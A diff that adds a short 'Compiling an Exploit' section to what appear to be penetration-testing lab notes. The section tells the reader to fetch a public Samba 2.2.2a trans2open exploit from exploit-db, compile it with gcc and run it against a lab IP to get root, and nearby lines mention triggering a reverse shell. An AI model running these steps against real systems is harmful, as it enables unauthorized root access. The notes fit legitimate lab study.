@@ -508,6 +508,16 @@ then run the exploit and trigger the reverse shell
 
     whoami can find out well who is connected
 
+**Compiling an Exploit**
+
+google the exploit Samba 2.2.2a (was the result of first attack vector with metasploit)
+https://www.exploit-db.com/exploits/10
+Download the exploit
+
+    gcc 10.c -o trans2open
+    ./trans2open -b 0 10.0.2.5
+
+Should give you root access
 
 
 
